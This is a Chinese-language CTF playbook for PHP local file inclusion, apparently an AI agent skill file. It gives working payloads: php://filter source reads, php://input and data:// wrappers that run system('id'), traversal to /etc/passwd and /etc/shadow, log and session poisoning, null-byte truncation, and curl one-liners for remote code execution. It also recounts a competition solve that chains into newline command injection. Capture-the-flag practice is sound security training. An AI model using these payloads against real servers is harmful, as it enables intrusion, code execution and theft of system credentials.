---
name: ctf-web-lfi
description: CTF LFI/文件包含 攻击 playbook。识别/触发：LFI/本地文件包含/RFI/远程文件包含/file inclusion/?file=/?page=/?p=/?path=/include/require/php://filter/convert.base64-encode/resource/php://input/zip:///data:///phar://协议wrapper/路径穿越/../../etc/passwd/截断/空字节%00/日志包含/session包含/proc/self/environ。碰到参数直接拼进 include/require、源码含 include($_GET[..])、提示"用 php://filter 绕过"、需要读 PHP 源码或 /flag 等指纹时，由二级 ctf-web 路由表调用本 leaf，专项解决"这个文件包含考点怎么打"。
---

# CTF LFI/文件包含 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"文件包含怎么读源码、怎么拿 RCE"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。

## 识别特征（什么时候调我）

- 参数 `?file= ?page= ?p= ?path= ?template=` 直接被拼进 `include`/`require`/`include_once`
- 源码审计见 `include($_GET['p'].".php")`、`require $_GET[..]`（**强制追加 `.php` 后缀是 php://filter 读源码的关键信号**）
- 题面提示"用 `php://filter` 绕过""有一个隐藏的文件包含点"
- 想读 PHP 源码（base64 编码绕过解析）、读 `/etc/passwd`、读 `/flag`、读 `/proc/self/environ`

## 核心攻击手法

### 1. php://filter 读源码（CTF 最常见，先试）

`include` 会把文件当 PHP 解析，但 `php://filter/convert.base64-encode/resource=x` 把源码 base64 后输出，**绕过 PHP 解析**看到原始代码。`include($_GET['p'].".php")` 场景下传 `resource=you_find_upload`，自动拼成读 `you_find_upload.php` 的源码：

```bash
# 读 you_find_upload.php 源码（include 追加 .php，故 resource 不带后缀）
curl -s "$T/you_find_upload.php?p=php://filter/convert.base64-encode/resource=you_find_upload"
# 解码
echo '<base64串>' | base64 -d
```

变形：`read=convert.base64-encode`、`convert.base64-decode`（写入场景）、`string.rot13`、`convert.iconv.<a>.<b>`（iconv 链，可绕过滤甚至写文件）。

### 2. wrapper 全家桶

| Wrapper | 用途 |
|---|---|
| `php://filter` | 读/写源码（见上，最常用） |
| `php://input` | 读 `POST raw body`，可配合 RCE（`<?php system('id');?>` POST 进去） |
| `file://` | 绝对路径读文件（`file:///flag`、`file:///etc/passwd`） |
| `data://` | `data://text/plain,<?php system('id');?>` 或 base64，等价 RFI |
| `zip://` / `phar://` | 从压缩包/phar 内读文件，绕后缀限制（`phar://x.zip/shell.php`），phar 还可触发反序列化 |
| `compress.zlib://` / `bzip2://` | 配合日志/临时文件 |

### 3. 路径穿越

```text
../../../../etc/passwd
../../../../etc/shadow
/proc/self/environ          # UA 可控时写入 PHP → 包含即 RCE
/var/log/apache2/access.log # 日志包含（UA 注入 PHP）
/tmp/sess_<PHPSESSID>       # session 文件包含（session可控写入）
/proc/self/cmdline / /proc/self/fd/N
```

### 4. 后缀/截断绕过

- **空字节截断**（PHP<5.3.4）：`?file=/flag%00`（追加的 `.php` 被截断）
- **点+斜杠**：`/flag/.`、`/flag/.`（绕过部分检查）
- **超长路径截断**（Windows）：重复 `./` 或 `.` 几千次
- **不被追加后缀**：`zip://`、`phar://`、`data://`、`php://input` 天然带后缀名，不受 `.php` 追加影响

### 5. 临时文件 + LFI 拿 RCE（无写权限时）

`php://filter` 的 iconv 链（`php_filter_chain_generator`）或竞态包含 `/tmp/phpXXXXXX` 临时文件 → 在无上传点时直接 RCE。

## CTF 实战结晶

**文件上传与文件包含（GZCTF / TopSecCTF，已确认）**——`php://filter` 读源码 + ping.php `%0a` 命令注入：

- 目标 net 工具集，`you_find_upload.php` 导航栏直接泄露 payload 模板：
  `?p=php://filter/convert.base64-encode/resource=you_find_upload`
- 确认 LFI 参数为 **`p`**，`@include $_GET['p'].".php"`（强制追加 `.php` + 过滤 `../`）。
- 读 `you_find_upload.php`、`ping.php` 源码（base64 文本在 `<pre>` 内，前面带随机数 `739528326`，剥掉即可解码）。
- **判读关键**：`flag.php` 经 `php://filter` 读出 0 字节 → flag **不在** `flag.php`；源码看 `ping.php` 黑名单漏 `%0a` + IP 正则不锚定结尾 → 转 `ctf-web-cmdi`：`?ip=0.0.0.0%0aenv` → `GZCTF_FLAG=flag{...}`。
- **方法论**：LFI 读源码后，源码通常指向下一个考点（命令注入/上传/反序列化）；flag 直读失败时别硬试变体，回源码找别的链。

## 工具命令

```bash
# php://filter 读源码（resource 不带 .php，因 include 会追加）
curl -s "$T/x.php?p=php://filter/convert.base64-encode/resource=TARGET" | sed -n '/<pre>/,/<\/pre>/p' | tail -1 | base64 -d
# php://input RCE
curl -s "$T/x.php?p=php://input" --data '<?php system("id"); ?>'
# data:// RCE
curl -s "$T/x.php?p=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"
# 绝对路径直读
curl -s "$T/x.php?p=/etc/passwd"
```

## 深度参考（穷尽技巧时加载）

- hack-skills-main/skills/path-traversal-lfi/SKILL.md —— 完整 wrapper 矩阵、iconv filter chain、日志/session 包含、真实绕过案例

## 关联 leaf

- `ctf-web-cmdi`：LFI 读源码后常转命令注入（同 file-upload-lfi 题，`%0a` 注入 env 拿 flag）
- `ctf-web-upload`：白名单/图片马场景，上传后靠包含触发；同题 `you_find_upload.php` 上传与 LFI 并存
- `ctf-web-ssrf`：`file://` 直读 vs `php://filter` 读源码手法重叠，CTF 题里 SSRF 读 flag.php 与 LFI 读 flag.php 常互为备选
- `ctf-web-deser`：`phar://` 触发反序列化是 LFI 与反序列化的交叉点
